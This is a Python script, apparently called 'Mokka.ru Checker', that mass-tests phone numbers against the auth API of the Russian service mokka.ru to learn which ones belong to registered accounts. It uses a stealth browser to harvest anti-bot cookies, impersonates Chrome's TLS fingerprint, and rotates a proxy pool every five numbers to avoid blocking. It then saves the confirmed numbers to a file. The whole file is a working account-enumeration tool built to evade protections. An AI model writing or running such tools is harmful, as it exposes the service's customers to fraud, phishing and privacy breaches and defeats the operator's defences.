from curl_cffi import requests as curl_requests
import subprocess
import re
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor
import threading

INPUT_FILE = "numbers.txt"
VALID_FILE = "valid.txt"
INVALID_FILE = "invalid.txt"
PROXY_FILE = "proxies.txt"
WORKERS = 10
BATCH_SIZE = 5
DELAY = 0.1

API_URL = "https://mokka.ru/rest/v2/auth"
SITE_URL = "https://mokka.ru/cc/"

lock = threading.Lock()
valid_count = 0
invalid_count = 0
error_count = 0
checked_count = 0
start_time = None


def format_phone(phone: str) -> str:
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('8') and len(phone) == 11:
        phone = '7' + phone[1:]
    elif len(phone) == 10:
        phone = '7' + phone
    return phone


def load_lines(filename: str) -> list:
    try:
        with open(filename, 'r') as f:
            return [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except FileNotFoundError:
        return []


def format_proxy(proxy: str) -> str:
    if not proxy.startswith('http'):
        return f"http://{proxy}"
    return proxy


def get_cookies_sync(proxy: str):
    proxy_url = proxy.replace("http://", "").replace("https://", "")
    script = f'''
import asyncio
import json
import warnings
import traceback
warnings.filterwarnings("ignore")

async def main():
    browser = None
    try:
        from camoufox.async_api import AsyncCamoufox
    except ImportError as e:
        print(json.dumps({{"error": "camoufox not installed: " + str(e)}}))
        return
    try:
        browser = await AsyncCamoufox(
            headless=True,
            proxy={{"server": "http://{proxy_url}"}}
        ).__aenter__()
        page = await browser.new_page()
        await page.goto("{SITE_URL}", wait_until="networkidle", timeout=30000)
        await asyncio.sleep(5)
        cookies_list = await page.context.cookies()
        cookies = {{c["name"]: c["value"] for c in cookies_list}}
        ua = await page.evaluate("navigator.userAgent")
        print(json.dumps({{"cookies": cookies, "ua": ua}}))
    except Exception as e:
        err_msg = str(e)
        if "firefox" in err_msg.lower() or "executable" in err_msg.lower():
            err_msg = "Firefox not installed. Run: python -m playwright install firefox"
        print(json.dumps({{"error": err_msg}}))
    finally:
        if browser:
            try:
                await browser.__aexit__(None, None, None)
            except:
                pass

asyncio.run(main())
'''
    try:
        import sys
        result = subprocess.run(
            [sys.executable, '-c', script],
            capture_output=True,
            text=True,
            timeout=45
        )
        if result.stdout.strip():
            lines = result.stdout.strip().split('\n')
            for line in reversed(lines):
                try:
                    data = json.loads(line)
                    if 'error' in data:
                        print(f"    [ERR] {data['error']}", flush=True)
                        return None, None
                    if 'cookies' in data:
                        if 'qrator_jsid' in data['cookies']:
                            return data['cookies'], data['ua']
                        else:
                            print(f"    [ERR] no qrator_jsid: {list(data['cookies'].keys())}", flush=True)
                            return None, None
                except:
                    continue
        else:
            print(f"    [ERR] empty browser output", flush=True)
            if result.stderr.strip():
                err_lines = result.stderr.strip().split('\n')
                for line in err_lines[-5:]:
                    print(f"    [STDERR] {line}", flush=True)
            print(f"    [DBG] returncode={result.returncode}", flush=True)
    except subprocess.TimeoutExpired:
        print(f"    [ERR] browser timeout 45s", flush=True)
    except Exception as e:
        print(f"    [ERR] {type(e).__name__}: {e}", flush=True)
    return None, None


def check_number(phone: str, cookies: dict, user_agent: str, proxy: str) -> tuple:
    formatted = format_phone(phone)
    if len(formatted) != 11:
        return (phone, None, "bad format")

    headers = {
        "User-Agent": user_agent,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mokka.ru",
        "Referer": "https://mokka.ru/cc/",
        "application-source": "b2c-web-app",
    }
    if 'fingerprintjs' in cookies:
        headers['x-mokka-device'] = cookies['fingerprintjs']

    try:
        resp = curl_requests.post(
            API_URL,
            json={"mobile_phone": formatted},
            headers=headers,
            cookies=cookies,
            proxies={"http": proxy, "https": proxy},
            impersonate="chrome131",
            timeout=10
        )
        if resp.status_code in [200, 201]:
            data = resp.json()
            next_step = data.get("next_step", "")
            if next_step in ["phone_confirmation", "registration_phone_confirmation"]:
                return (phone, True, "")
            elif next_step == "registration_landing":
                return (phone, False, "")
            return (phone, None, f"unknown: {next_step}")
        return (phone, None, f"{resp.status_code}")
    except Exception as e:
        return (phone, None, str(e)[:30])


def save_result(phone: str, is_valid: bool):
    filename = VALID_FILE if is_valid else INVALID_FILE
    with lock:
        with open(filename, 'a') as f:
            f.write(phone + '\n')


def worker(worker_id: int, numbers: list, proxies: list, proxy_offset: int):
    global valid_count, invalid_count, error_count, checked_count

    proxy_idx = proxy_offset
    cookies = None
    user_agent = None
    current_proxy = None
    batch_count = 0

    for phone in numbers:
        if cookies is None or batch_count >= BATCH_SIZE:
            if proxy_idx >= len(proxies):
                print(f"[W{worker_id}] Прокси закончились", flush=True)
                break

            current_proxy = proxies[proxy_idx]
            proxy_idx += 1
            print(f"[W{worker_id}] Получаю куки через прокси #{proxy_idx}...", flush=True)
            cookies, user_agent = get_cookies_sync(current_proxy)

            if not cookies:
                print(f"[W{worker_id}] Не удалось, пробую следующий", flush=True)
                continue
            print(f"[W{worker_id}] Куки получены!", flush=True)
            batch_count = 0

        original, is_valid, reason = check_number(phone, cookies, user_agent, current_proxy)
        batch_count += 1

        with lock:
            checked_count += 1
            elapsed = time.time() - start_time
            speed = checked_count / elapsed if elapsed > 0 else 0

        if is_valid is True:
            with lock:
                valid_count += 1
            save_result(original, True)
            print(f"[W{worker_id}] [+] {original} -> VALID  [{checked_count}] {speed:.1f}/сек", flush=True)

        elif is_valid is False:
            with lock:
                invalid_count += 1
            save_result(original, False)
            print(f"[W{worker_id}] [-] {original} -> INVALID  [{checked_count}] {speed:.1f}/сек", flush=True)

        else:
            with lock:
                error_count += 1
            print(f"[W{worker_id}] [!] {original} -> ERROR ({reason})  [{checked_count}]", flush=True)
            if reason in ["403", "401"]:
                cookies = None

        time.sleep(DELAY)


def main():
    global start_time

    print("=" * 50)
    print("  Mokka.ru Checker")
    print("=" * 50)

    numbers = load_lines(INPUT_FILE)
    if not numbers:
        print(f"[!] Файл {INPUT_FILE} пуст")
        return

    proxies = load_lines(PROXY_FILE)
    if not proxies:
        print(f"[!] Файл {PROXY_FILE} пуст")
        return

    proxies = [format_proxy(p) for p in proxies]
    random.shuffle(proxies)

    print(f"[*] Номеров: {len(numbers)}")
    print(f"[*] Прокси: {len(proxies)}")
    print(f"[*] Воркеров: {WORKERS}")
    print(f"[*] Номеров на прокси: {BATCH_SIZE}")
    print("-" * 50)

    open(VALID_FILE, 'w').close()
    open(INVALID_FILE, 'w').close()

    chunk_size = len(numbers) // WORKERS
    proxies_per_worker = len(proxies) // WORKERS

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = []
        for i in range(WORKERS):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < WORKERS - 1 else len(numbers)
            worker_numbers = numbers[start_idx:end_idx]
            proxy_offset = i * proxies_per_worker

            futures.append(
                executor.submit(worker, i, worker_numbers, proxies, proxy_offset)
            )

        for f in futures:
            f.result()

    elapsed = time.time() - start_time
    print("\n" + "=" * 50)
    print(f"[*] ГОТОВО за {elapsed:.1f} сек")
    print(f"    Valid: {valid_count}")
    print(f"    Invalid: {invalid_count}")
    print(f"    Errors: {error_count}")
    print(f"    Скорость: {checked_count/elapsed:.1f}/сек")


if __name__ == "__main__":
    main()
